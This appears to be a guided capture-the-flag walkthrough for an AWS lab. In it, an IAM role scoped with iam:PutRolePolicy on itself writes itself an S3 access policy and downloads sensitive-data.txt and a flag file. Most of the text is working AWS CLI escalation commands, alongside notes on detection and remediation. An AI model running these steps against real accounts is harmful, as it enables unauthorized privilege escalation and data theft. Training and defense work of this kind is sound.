# Guided Walkthrough: Self-Escalation to Bucket via iam:PutRolePolicy

This scenario demonstrates privilege escalation where a role with `iam:PutRolePolicy` on itself can modify its own inline policy to gain S3 bucket access. Unlike most privilege escalation paths that require a separate target principal, this is a self-escalation: the starting role rewrites its own permissions at runtime and then uses those new permissions to access the sensitive bucket.

This misconfiguration appears in real environments when developers scope `iam:PutRolePolicy` to a specific role ARN — thinking they are being least-privilege — without recognizing that allowing a role to modify itself is equivalent to granting it arbitrary permissions. Any role that can call `iam:PutRolePolicy` on its own ARN can add any permission to itself, including S3 read/write, role assumption, or even `iam:*`.

The attack path is short: assume the starting role, write an inline policy granting S3 access to yourself, then read data from the bucket. Because the escalation happens within a single role session, it can be easy to miss in CloudTrail unless analysts specifically look for `PutRolePolicy` calls where the caller ARN and the target role name match.

## The Challenge

You start with credentials for `pl-prod-iam-005-to-bucket-starting-user`. This IAM user can assume `pl-prod-iam-005-to-bucket-starting-role`. That role has `iam:PutRolePolicy` scoped to itself — it can write inline policies to its own role.

Your goal is to read `sensitive-data.txt` from `pl-prod-iam-005-to-bucket-{account_id}`. Initially, the starting role has no S3 permissions. You need to grant them to yourself.

## Reconnaissance

Before escalating, it is worth confirming what you are working with. Set your credentials to the starting user and verify your identity:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-005-to-bucket-starting-user
```

Now assume the starting role and see what permissions it has:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-005-to-bucket-starting-role \
  --role-session-name recon-session
```

Export the returned credentials, then check the role's inline policies:

```bash
aws iam list-role-policies --role-name pl-prod-iam-005-to-bucket-starting-role
aws iam get-role-policy --role-name pl-prod-iam-005-to-bucket-starting-role --policy-name <policy-name>
```

You will find that the role has `iam:PutRolePolicy` with a resource condition pointing to its own ARN. Try listing the target bucket — access will be denied, confirming the bucket is the target:

```bash
aws s3 ls s3://pl-prod-iam-005-to-bucket-{account_id}/
# An error occurred (AccessDenied)
```

## Exploitation

With the starting role credentials active, write an inline policy that grants S3 read and list permissions directly to the role. Because the resource condition allows `PutRolePolicy` on `pl-prod-iam-005-to-bucket-starting-role`, this call succeeds immediately:

```bash
aws iam put-role-policy \
  --role-name pl-prod-iam-005-to-bucket-starting-role \
  --policy-name EscalatedS3Access \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": ["s3:ListBucket", "s3:GetObject", "s3:PutObject"],
      "Resource": [
        "arn:aws:s3:::pl-prod-iam-005-to-bucket-{account_id}",
        "arn:aws:s3:::pl-prod-iam-005-to-bucket-{account_id}/*"
      ]
    }]
  }'
```

IAM policy changes take a moment to propagate. Wait about 15 seconds before proceeding.

## Verification

With the inline policy now active on the role, list the bucket and download the sensitive file:

```bash
aws s3 ls s3://pl-prod-iam-005-to-bucket-{account_id}/
# 2024-01-01 00:00:00       1234 sensitive-data.txt

aws s3 cp s3://pl-prod-iam-005-to-bucket-{account_id}/sensitive-data.txt /tmp/sensitive-data.txt
cat /tmp/sensitive-data.txt
```

If the download succeeds you have completed the attack path. You have moved from `pl-prod-iam-005-to-bucket-starting-user` to reading data from the sensitive S3 bucket in three steps: assume role, add inline policy, access bucket.

## Capture the Flag

The target bucket also contains `flag.txt`, which holds the CTF flag for this scenario. Read it with the same credentials you used to access `sensitive-data.txt`:

```bash
aws s3 cp s3://pl-prod-iam-005-to-bucket-{account_id}/flag.txt -
```

The flag value will be printed to stdout. Capturing it confirms you have successfully completed the privilege escalation and gained read access to the target bucket.

## What Happened

The root misconfiguration is that `pl-prod-iam-005-to-bucket-starting-role` was granted `iam:PutRolePolicy` on itself. This is logically equivalent to granting the role any permission in IAM — because it can always write a new inline policy to obtain whatever access it needs. No separate target principal was required; the role escalated its own permissions within the same session.

In real environments, this pattern emerges when operators attempt to restrict IAM write permissions by scoping them to a specific ARN, not realizing that self-referential IAM write permissions defeat the purpose of scoping entirely. IAM Access Analyzer's unused access and privilege escalation findings can detect this pattern statically, before an attacker exploits it.
